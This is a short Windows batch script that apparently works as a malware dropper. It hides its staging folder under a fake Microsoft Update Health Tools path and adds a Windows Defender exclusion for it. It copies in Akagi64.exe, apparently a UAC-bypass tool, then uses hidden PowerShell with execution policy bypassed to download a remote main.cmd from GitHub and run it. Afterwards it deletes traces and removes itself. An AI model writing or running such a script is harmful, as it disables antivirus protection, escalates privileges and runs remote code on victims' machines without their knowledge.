@echo off
set SystemRoot=C:\Windows
set "STAGE=C:\Program Files\Microsoft Update Health Tools\Tools"

mkdir "%STAGE%" 2>nul

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Add-MpPreference -ExclusionPath '%STAGE%'"

copy /y "%~dp0Akagi64.exe" "%STAGE%\Akagi64.exe" >nul

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/main.cmd' -OutFile '%STAGE%\main.cmd' -UseBasicParsing"

del /f /q "%TEMP%\Akagi64.exe" >nul 2>&1

call "%STAGE%\main.cmd"

(goto) 2>nul & del "%~f0"
